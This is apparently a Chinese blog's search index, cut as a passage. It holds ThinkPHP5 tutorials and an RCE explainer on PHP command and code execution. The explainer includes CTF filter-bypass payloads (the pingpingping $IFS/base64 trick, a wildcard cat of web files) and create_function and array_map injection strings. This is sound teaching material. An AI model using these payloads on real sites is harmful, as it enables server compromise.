$request-&gt;baseUrl() . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F; 获取URL访问的ROOT地址</span><br><span class="line">echo &#39;root:&#39; . $request-&gt;root() . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F; 获取URL访问的ROOT地址</span><br><span class="line">echo &#39;root with domain: &#39; . $request-&gt;root(true) . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F; 获取URL地址中的PATH_INFO信息</span><br><span class="line">echo &#39;pathinfo: &#39; . $request-&gt;pathinfo() . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F; 获取URL地址中的PATH_INFO信息 不含后缀</span><br><span class="line">echo &#39;pathinfo: &#39; . $request-&gt;path() . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F; 获取URL地址中的后缀信息</span><br><span class="line">echo &#39;ext: &#39; . $request-&gt;ext() . &#39;&lt;br&#x2F;&gt;&#39;;</span><br></pre></td></tr></table></figure><h4 id="输出结果为："><a href="#输出结果为：" class="headerlink" title="输出结果为：   "></a><font color = red>输出结果为：   </font></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">domain: http:&#x2F;&#x2F;tp5.com</span><br><span class="line">file: &#x2F;index.php url: &#x2F;index&#x2F;index&#x2F;hello.html?name&#x3D;thinkphp</span><br><span class="line">url with domain: http:&#x2F;&#x2F;tp5.com&#x2F;index&#x2F;index&#x2F;hello.html?name&#x3D;thinkphp</span><br><span class="line">url without query: &#x2F;index&#x2F;index&#x2F;hello.html</span><br><span class="line">root:</span><br><span class="line">root with domain: http:&#x2F;&#x2F;tp5.com</span><br><span class="line">pathinfo: index&#x2F;index&#x2F;hello.html</span><br><span class="line">pathinfo: index&#x2F;index&#x2F;hello</span><br><span class="line">ext: html</span><br></pre></td></tr></table></figure><h3 id="设置-获取-模块-控制器-操作名称"><a href="#设置-获取-模块-控制器-操作名称" class="headerlink" title="设置/获取 模块/控制器/操作名称"></a><font color=red>设置/获取 模块/控制器/操作名称</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$request &#x3D; Request::instance();</span><br><span class="line">echo &quot;当前模块名称是&quot; . $request-&gt;module();</span><br><span class="line">echo &quot;当前控制器名称是&quot; . $request-&gt;controller();</span><br><span class="line">echo &quot;当前操作名称是&quot; . $request-&gt;action();</span><br></pre></td></tr></table></figure><p>如果当前访问的地址是 <a href="http://serverName/index.php/index/hello_world/index" target="_blank" rel="noopener">http://serverName/index.php/index/hello_world/index</a><br>输出结果为：   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前模块名称是index</span><br><span class="line">当前控制器名称是HelloWorld</span><br><span class="line">当前操作名称是index</span><br></pre></td></tr></table></figure><p>设置模块名称值需要向module方法中传入名称即可，同样使用于设置控制器名称和操作名称   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request::instance()-&gt;module(&#39;module_name&#39;);</span><br></pre></td></tr></table></figure><h3 id="获取请求参数"><a href="#获取请求参数" class="headerlink" title="获取请求参数"></a><font color = red>获取请求参数</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$request &#x3D; Request::instance();</span><br><span class="line">echo &#39;请求方法：&#39; . $request-&gt;method() . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">echo &#39;资源类型：&#39; . $request-&gt;type() . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">echo &#39;访问ip地址：&#39; . $request-&gt;ip() . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">echo &#39;是否AJax请求：&#39; . var_export($request-&gt;isAjax(), true) . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">echo &#39;请求参数：&#39;;</span><br><span class="line">dump($request-&gt;param());</span><br><span class="line">echo &#39;请求参数：仅包含name&#39;;</span><br><span class="line">dump($request-&gt;only([&#39;name&#39;]));</span><br><span class="line">echo &#39;请求参数：排除name&#39;;</span><br><span class="line">dump($request-&gt;except([&#39;name&#39;]));</span><br><span class="line">输出结果为：</span><br><span class="line">请求方法：GET</span><br><span class="line">资源类型：html</span><br><span class="line">访问ip地址：127.0.0.1</span><br><span class="line">是否Ajax请求：false</span><br><span class="line">请求参数：</span><br><span class="line">array (size&#x3D;2)</span><br><span class="line">&#39;test&#39; &#x3D;&gt; string &#39;ddd&#39; (length&#x3D;3)</span><br><span class="line">&#39;name&#39; &#x3D;&gt; string &#39;thinkphp&#39; (length&#x3D;8)</span><br><span class="line">请求参数：仅包含name</span><br><span class="line">array (size&#x3D;1)</span><br><span class="line">&#39;name&#39; &#x3D;&gt; string &#39;thinkphp&#39; (length&#x3D;8)</span><br><span class="line">请求参数：排除name</span><br><span class="line">array (size&#x3D;1)</span><br><span class="line">&#39;test&#39; &#x3D;&gt; string &#39;ddd&#39; (length&#x3D;3)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/undefined/RCE/"/>
      <url>/undefined/RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE漏洞原理"><a href="#RCE漏洞原理" class="headerlink" title="RCE漏洞原理"></a>RCE漏洞原理</h1><p> <strong>英文全称：remote command/code execute(远程命令/代码执行漏洞)；</strong></p><h3 id="RCE分为远程命令执行和远程代码执行"><a href="#RCE分为远程命令执行和远程代码执行" class="headerlink" title="RCE分为远程命令执行和远程代码执行"></a>RCE分为<font color = red>远程命令执行</font>和<font color = red>远程代码执行</font></h3><p>区别：   </p><ul><li>能够对一个php的站点，控制php代码，那么我们就把它划分为代码执行      </li><li>如果能执行网站所在服务器中的命令，我们这就把它划分为命令执行，因为它执行的是系统命令</li></ul><h2 id="0x0-远程命令执行"><a href="#0x0-远程命令执行" class="headerlink" title="0x0 远程命令执行"></a>0x0 远程命令执行</h2><h4 id="命令执行漏洞指的是可以执行系统或者应用指令的漏洞"><a href="#命令执行漏洞指的是可以执行系统或者应用指令的漏洞" class="headerlink" title="命令执行漏洞指的是可以执行系统或者应用指令的漏洞"></a>命令执行漏洞指的是可以执行系统或者应用指令的漏洞</h4><p>如CMD命令或者bash命令的漏洞，PHP的命令执行漏洞主要基于一些函数的参数过滤不严导致，可以执行命令的函数有:<br><font color =red >system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open(),ob_start()，mail函数+LD_PRELOAD </font><br>执行系统命令共九个函数,另外反引号(`)也可以执行命令,不过实际上这种方式也是调用的shell_exec()函数。</p><h2 id="讲解函数"><a href="#讲解函数" class="headerlink" title="讲解函数"></a>讲解函数</h2><p>php提供了system(),exec(),passthru()这几个函数来调用外部的命令.    </p><p><font color = red>他们的区别 :</font>   </p><ul><li>exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，第三个参数用来取得命令执行的状态码，通常执行成功都是返回０。  </li><li>system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</li><li>passthru与exec的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。   </li></ul><p><font color = red>相同点:</font>  </p><ul><li>都可以获得命令执行的状态码  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux下一条命令或一个进程执行完成会返回一个一个状态码。</span><br><span class="line"></span><br><span class="line">0   &#x3D;&#x3D;&#x3D;   成功执行</span><br><span class="line"></span><br><span class="line">非0 &#x3D;&#x3D;&#x3D;  执行过程中出现异常或非正常退出</span><br></pre></td></tr></table></figure>在PHP中调用外部命令，可以用如下三种方法来实现：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;system(&#39;whoami&#39;):   &quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">system(&#39;whoami&#39;);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;var_dump(exec(&#39;ipconfig&#39;)):   &quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">var_dump(exec(&#39;ipconfig&#39;));</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &#39;exec(whoami,$b):&#39;;</span><br><span class="line">exec(&#39;whoami&#39;,$b);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">var_dump($b);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;exec(&#39;whoami&#39;)&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">exec(&#39;whoami&#39;);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;passthru(&#39;whoami&#39;):&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">passthru(&#39;whoami&#39;);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;shell_exec(&#39;ipconfig&#39;)&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li><li><em>popen()函数*</em><br>popen()、proc_open()函数不会直接返回执行结果，而是返回一个文件指针，但命令是已经执行了的，下面我们看看 popen()的用法,它需要两个参数,一个是执行的命令,另<br>外一个是指针文件的连接模式，有r 和 w代表读和写。<br>测试代码如下：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windows下</span><br><span class="line">&lt;?php</span><br><span class="line">popen(&#39;dir &gt;&gt;E:&#x2F;2.txt&#39;,&#39;w&#39;)</span><br><span class="line">&#x2F;&#x2F;把标准输出重定向到一个文件中(追加)</span><br><span class="line">?&gt;</span><br><span class="line">linux下：</span><br><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; popen(&quot;&#x2F;bin&#x2F;ls&quot;,&quot;r&quot;);</span><br><span class="line">&#x2F;&#x2F;some code to be executed</span><br><span class="line">pclose($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="CTF例题："><a href="#CTF例题：" class="headerlink" title="CTF例题："></a><font color = gree>CTF例题：</font></h2><ul><li><p>DVWA靶场命令执行题<br><a href="http://127.0.0.1:8000/DVWA/vulnerabilities/exec/" target="_blank" rel="noopener">http://127.0.0.1:8000/DVWA/vulnerabilities/exec/</a></p></li><li><p>附一道GXY的题，现在buu上的pingpingping</p></li><li><pre><code>$ip=|\&apos;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&apos;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);    die(&quot;fxck your symbol!&quot;);  } else if(preg_match(&quot;/ /&quot;, $ip)){    die(&quot;fxck your space!&quot;);  } else if(preg_match(&quot;/bash/&quot;, $ip)){    die(&quot;fxck your bash!&quot;);  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){    die(&quot;fxck your flag!&quot;);  }  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);  echo &quot;&quot;;  print_r($a);}?&gt;//payload：127.0.0.1|ls;a=`echo$IFS$9ZmxhZy5waHA=|base64$IFS$9-d`;base64$IFS$9$a<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## &lt;font color &#x3D; gree&gt;远程代码执行&lt;&#x2F;font&gt;</span><br><span class="line">代码执行漏洞是指应用程序本身过滤不严,用户可以通过请求将代码注入到应用中执行.说得好理解一点类似于SQL注人漏洞,可以把SQL语句注入到SQL服务执行，而PHP代码执行漏洞则是可以把代码注入</span><br><span class="line">到应用中，最终到Webserver去执行。   </span><br><span class="line"></span><br><span class="line">这样的漏洞如果没有特殊的过滤，相当于直接有一个Web后门存在，该漏洞主要由&lt;font color &#x3D; red&gt;eval()、assert()、preg_replace()、call_user_func()call_user_func_array()、array_map()&lt;&#x2F;font&gt;等函数的参数过滤不严格导致     </span><br><span class="line"></span><br><span class="line">另外还有PHP的动态函数（$a($b))也是目前出现比较多的。</span><br><span class="line"></span><br><span class="line">## &lt;font color &#x3D; gree&gt;讲解函数&lt;&#x2F;font&gt;</span><br><span class="line">### &lt;font color &#x3D; red&gt;eval()函数&lt;&#x2F;font&gt;   </span><br><span class="line">eval() 函数把字符串按照 PHP 代码来计算。   </span><br><span class="line">该字符串必须是合法的 PHP 代码，且必须以分号结尾。    </span><br><span class="line">如果代码中存在解析错误，则 eval() 函数返回 false。</span><br></pre></td></tr></table></figure>&lt;?php$a = &apos;aaa&apos;;$b = &apos;bbb&apos;;eval(&apos;$a=$b;&apos;);var_dump($a);<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~~</span><br><span class="line">&lt;?php</span><br><span class="line">eval(&#39;echo 1111;&#39;);</span><br></pre></td></tr></table></figure>代码不能包含打开/关闭PHP标签，但可以用合适的 PHP tag 来闭合离开、重新进入 PHP 模式。   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval(&#39;&lt;?php echo &quot;Hi!&quot;; ?&gt;&#39;);</span><br><span class="line">eval(&#39;echo &quot;In PHP mode!&quot;; ?&gt;In HTML mode!&lt;?php echo &quot;Hi!&quot;;&#39;);</span><br><span class="line">?&gt;闭合php文件开头的&lt;?php，&lt;?&#x3D;可以输出。</span><br><span class="line">另外这里&lt;? ?&gt;是短标签，&lt;?php ?&gt;是长标签。在php的配置文件php.ini中有一个short_open_tag的值，开启以后可以使用PHP的短标签：&lt;? ?&gt;同时，</span><br><span class="line">只有开启这个才可以使用 &lt;?&#x3D; 以代替 &lt;? echo。不过在php7中这个标签被移除了。</span><br></pre></td></tr></table></figure>### &lt;font color = red&gt;assert()函数&lt;/font&gt;  bool assert ( mixed $assertion [, string $description ] )    在PHP语言中是用来判断一个表达式是否成立，返回true or false。    如果assertion 是字符串，它将会被assert（）当做PHP代码来执行。    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$s &#x3D; 123;</span><br><span class="line">var_dump(assert(&quot;is_int($s)&quot;));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">function fo()&#123;</span><br><span class="line">  $fp &#x3D; fopen(&quot;E:&#x2F;&#x2F;2.txt&quot;,&#39;w&#39;);</span><br><span class="line">  fwrite($fp,&quot;123&quot;);</span><br><span class="line">  fclose($fp);</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(assert(&quot;fo()&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>函数原理：https://www.jianshu.com/p/6f7cc896ba2a### &lt;font color = red&gt;preg_replace()函数&lt;/font&gt;preg_replace 执行一个正则表达式的搜索和替换。</code></pre></li></ul><p>执行代码需要使用<code>/e</code>修饰符。如果不使用<code>/e</code>修饰符，代码则不会执行。这个函数比较早，5.5中它已经被弃用了，但是你一样可以去使用它，但是在7.0之后，你就没办法去调用。    </p><p>它的参数和返回如下：   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure><p>搜索 subject 中匹配 pattern 的部分，以 replacement 进行替换。<br>参数说明：<br>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。<br>$replacement: 用于替换的字符串或字符串数组。<br>$subject: 要搜索替换的目标字符串或字符串数组。<br>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。<br>$count: 可选，为替换执行的次数。    </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@preg_replace(&quot;&#x2F;\[(.*)\]&#x2F;e&quot;,&#39;\\1&#39;,$_GET[&#39;str&#39;]);</span><br><span class="line">&#x2F;&#x2F;preg_replace函数需要使用&#x2F;e修饰符执行正则。</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>正则的意思是GET传递的str变量里搜索中括号口中间的内容作为第一组结果， preg_replace（）函数<br>第二个参数为 ‘\\1’代表这里用第一组结果填充，这里是可以直接执行代码的，所以当我们请求 /1.php?str=[phpinfo()]时，则执行代码phpinfo()</p><p>这个函数比较复杂，感兴趣的可以去这个博客看看   </p><p><code>https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#%E6%A1%88%E4%BE%8B</code></p><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a><font color = red>create_function</font></h3><p>说明</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">string create_function ( string $args , string $code )</span><br></pre></td></tr></table></figure><p>该函数用来创建匿名函数。<br>这个函数的实现大概是这样的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$b = create_function(<span class="string">'$name'</span>,<span class="string">'echo $name;'</span>);</span><br><span class="line"><span class="comment">//实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span><span class="params">($name)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b(yang);</span><br><span class="line"></span><br><span class="line">niming(<span class="string">'yang'</span>);</span><br></pre></td></tr></table></figure><p>第二个参数是执行代码的地方，将payload放在第二个参数的位置，然后调用该函数就可以执行payload了。<br>执行代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">'phpinfo();'</span>;</span><br><span class="line">$b = create_function(<span class="string">" "</span>,$a);</span><br><span class="line">$b();</span><br></pre></td></tr></table></figure><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a><font color = red>array_map()</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array array_map ( callable $callback , array $array1 [, array $... ] )</span><br><span class="line">array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</span><br></pre></td></tr></table></figure><p>漏洞演示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//?a=assert&amp;b=phpinfo();</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$array[<span class="number">0</span>] = $b;</span><br><span class="line">$c = array_map($a,$array);</span><br></pre></td></tr></table></figure><h3 id="eval-函数例题："><a href="#eval-函数例题：" class="headerlink" title="eval()函数例题："></a>eval()函数例题：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_$]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>/bin/cat 执行命令</strong>    </p><p><strong>``反单引号执行命令</strong>   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;*&#96;?&gt;</span><br><span class="line">&quot;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;*&quot;</span><br></pre></td></tr></table></figure><p><strong>无字母数字preg_match绕过</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;v01cano&#x2F;p&#x2F;11736722.html</span><br></pre></td></tr></table></figure><h3 id="create-function例题"><a href="#create-function例题" class="headerlink" title="create_function例题"></a>create_function例题</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">$code = <span class="string">'echo $name. '</span>.<span class="string">'的编号是'</span>.$id.<span class="string">'; '</span>;</span><br><span class="line"></span><br><span class="line">$b = create_function(<span class="string">'$name'</span>,$code);</span><br><span class="line"><span class="comment">//实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span><span class="params">($name)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $name.<span class="string">"编号"</span>.$id;</span><br><span class="line">&#125;</span><br><span class="line">$b(<span class="string">'sd'</span>);</span><br><span class="line"><span class="comment">//payload：?id=2;&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB安全漏洞 </category>
          
          <category> RCE漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1.thinkphp5开发规范</title>
      <link href="/undefined/1.thinkphp5%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83/"/>
      <url>/undefined/1.thinkphp5%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<h1 id="一丶URL访问"><a href="#一丶URL访问" class="headerlink" title="一丶URL访问"></a><font color=green>一丶URL访问</font></h1><h2 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a><font color=green>命名规范</font></h2><h3 id="ThinkPHP5-遵循-PSR-2-命名规范和-PSR-4-自动加载规范，并且注意如下规范："><a href="#ThinkPHP5-遵循-PSR-2-命名规范和-PSR-4-自动加载规范，并且注意如下规范：" class="headerlink" title="ThinkPHP5 遵循 PSR-2 命名规范和 PSR-4 自动加载规范，并且注意如下规范："></a>ThinkPHP5 遵循 PSR-2 命名规范和 PSR-4 自动加载规范，并且注意如下规范：</h3><h3 id="目录和文件"><a href="#目录和文件" class="headerlink" title="目录和文件"></a><font color=red>目录和文件</font></h3><ul><li>目录使用小写+下划线；  </li><li>类库、 函数文件统一以 .php 为后缀；   </li><li>类的文件名均以命名空间定义，并且命名空间的路径和类库文件所在路径一致；   </li><li>类文件采用驼峰法命名（首字母大写），其它文件采用小写+下划线命名；   </li><li>类名和类文件名保持一致，统一采用驼峰法命名（首字母大写）；   <h3 id="函数和类、-属性命名"><a href="#函数和类、-属性命名" class="headerlink" title="函数和类、 属性命名  "></a><font color=red>函数和类、 属性命名  </font></h3></li><li>类的命名采用驼峰法（首字母大写），例如 User 、 UserType ，默认不需要添加后缀，例如<br>UserController 应该直接命名为 User ；   </li><li>函数的命名使用小写字母和下划线（小写字母开头）的方式，例如 get_client_ip ；   </li><li>方法的命名使用驼峰法（首字母小写），例如 getUserName ；   </li><li>属性的命名使用驼峰法（首字母小写），例如 tableName 、 instance ；   </li><li>以双下划线“__” 打头的函数或方法作为魔术方法，例如 __call 和 __autoload ；   <h3 id="常量和配置"><a href="#常量和配置" class="headerlink" title="常量和配置"></a><font color=red>常量和配置</font></h3></li><li>常量以大写字母和下划线命名，例如 APP_PATH 和 THINK_PATH ；  </li><li>配置参数以小写字母和下划线命名，例如 url_route_on 和 url_convert ；    <h3 id="数据表和字段"><a href="#数据表和字段" class="headerlink" title="数据表和字段 "></a><font color=red>数据表和字段 </font></h3></li><li>数据表和字段采用小写加下划线方式命名，并注意字段名不要以下划线开头，例如 think_user 表和<br>user_name 字段，不建议使用驼峰和中文作为数据表字段命名。   <h3 id="应用类库命名空间规范"><a href="#应用类库命名空间规范" class="headerlink" title="应用类库命名空间规范"></a><font color=red>应用类库命名空间规范</font></h3></li><li>应用类库的根命名空间统一为app（不建议更改，可以设置 app_namespace 配置参数更改， V5.0.8 版本<br>开始使用 APP_NAMESPACE 常量定义）；<br>例如： app\index\controller\Index 和 app\index\model\User 。   </li></ul>]]></content>
      
      
      <categories>
          
          <category> thinkphp5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp5 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
